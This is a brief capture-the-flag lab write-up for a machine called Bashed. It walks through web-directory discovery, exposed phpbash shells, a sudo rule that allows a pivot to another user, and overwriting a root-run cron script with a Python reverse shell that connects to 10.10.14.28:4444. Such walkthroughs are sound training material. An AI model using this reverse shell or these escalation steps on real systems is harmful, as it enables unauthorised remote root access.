# BASHED

only http open here 
after dirb ran we can see:
- ==> DIRECTORY: http://10.10.10.68/dev/

there is a 2 shells here 
- phpbash.min.php	2017-12-04 12:21 	4.6K	 
- phpbash.php	    2017-11-30 23:56 	8.1k

even if we are www-data we can access /home/arrexel so lets grab user.txt here

sudo -l 
```
User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

so we can 
```
sudo -u scriptmanager bash
```

now that we are scriptmanager lets see if there is some interresting files owned by us 
```
find / -user scriptmanager 2>&-
```

from here we've found /scripts and /scripts/test.py

```
scriptmanager@bashed:/scripts$ ls -la
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec 14 06:32 .
drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
-rw-r--r--  1 scriptmanager scriptmanager  222 Dec 14 06:31 test.py
-rw-r--r--  1 root          root            12 Dec 14 06:24 test.txt
```

we can see that test.txt is owned by root so there is a probably a cron owned by root that write this test.txt with test.py

so lets change test.py for 
```
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.28",4444));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```

and wait for the callback

rooted
